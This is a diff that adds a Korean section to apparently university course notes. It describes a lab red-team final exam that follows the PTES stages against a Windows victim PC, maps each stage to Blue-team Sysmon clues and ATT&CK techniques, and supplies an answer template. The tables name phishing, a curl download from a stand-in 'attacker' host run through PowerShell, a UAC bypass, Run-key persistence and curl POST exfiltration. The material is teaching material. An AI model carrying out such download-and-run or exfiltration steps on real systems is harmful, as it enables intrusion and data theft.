@@ -487,6 +487,46 @@ graph LR
 
 ---
 
+## 9.5 PTES 7 단계 × Windows victim PC — 기말의 표준 narrative (W03 secuops 위빙)
+
+본 기말의 PTES 7 단계는 — Pre-engagement / Intel Gathering / Threat Modeling / Vulnerability Analysis /
+Exploitation / Post-Exploitation / Reporting — 의 종합. **Windows 사용자 PC 를 표적** 으로 두는 것이
+가장 풍부한 시나리오를 만든다.
+
+### 7 단계 × Windows victim 시나리오
+
+| 단계 | Red 행동 | Blue 측 단서 |
+|------|---------|-------------|
+| ① Pre-engagement | 범위·rules of engagement 동의 (학기 시작 시 학생 동의서) | — |
+| ② Intel Gathering | nmap 10.20.32.60 → 22/3389/445/5985 발견 | fw events.log (포트 access 패턴) |
+| ③ Threat Modeling | RDP brute / SMB null / WinRM brute 후보 식별 | — (계획 단계) |
+| ④ Vulnerability Analysis | 약한 비밀번호 / 패치 미적용 / 사용자 행동 가설 | osquery / Sysmon EID 1 baseline |
+| ⑤ Exploitation | 직원에게 피싱 → curl 다운로드 → powershell 실행 | **Sysmon EID 1+3+11 (Win) + WAF/Suricata** |
+| ⑥ Post-Exploitation | 권한상승(UAC bypass) → 지속성(Run key) → 데이터 유출(curl POST) | **Sysmon EID 13 (Registry) + 3 (outbound)** |
+| ⑦ Reporting | 7 단계 timeline + 권장 5 + 영향 평가 | — (학생 report) |
+
+### 기말 답안 양식 (Reporting 단계의 결과물)
+
+```
+| 단계 | 시각 (Day-HH:MM) | 행동·도구 | 흔적 (Blue 측 source/EID) | ATT&CK |
+| --- | --- | --- | --- | --- |
+| ② Intel | D1-09:00 | nmap -p 22,135,139,445,3389,5985 | fw events 포트 access | T1595 |
+| ⑤ Exploit | D1-10:30 | curl http://attacker/x.exe + powershell | Sysmon EID 1+3 (Win) | T1059.001 |
+| ⑥ Post | D1-11:00 | Run key 등록 + DNS 콜백 | Sysmon EID 13 + 22 | T1547.001 + T1071.004 |
+```
+
+### 평가 핵심
+
+- 7 단계 모두 실측 흔적이 있어야 (시뮬레이션이지만 6v6 에서 정말 실행).
+- 각 단계의 흔적이 **Blue 의 어디서 잡히는지** 학생이 정확히 안다 (Red 의 자기 인식).
+- ATT&CK 매핑이 7 Tactic 중 5 이상 cover.
+- Reporting 의 **영향 평가** (CIA + 비즈니스 영향) 가 1 페이지 narrative.
+
+> **본 기말의 메시지** — Red Team 의 완성도 = 자기 흔적을 정확히 그릴 수 있는 능력. Windows 사용자
+> PC 가 들어옴으로써 그 narrative 가 깊고 풍부해졌다.
+
+---
+
 ## 10. 본 과목 학습 마무리 — 15 주의 종합
 
 ### 10.1 학습한 내용
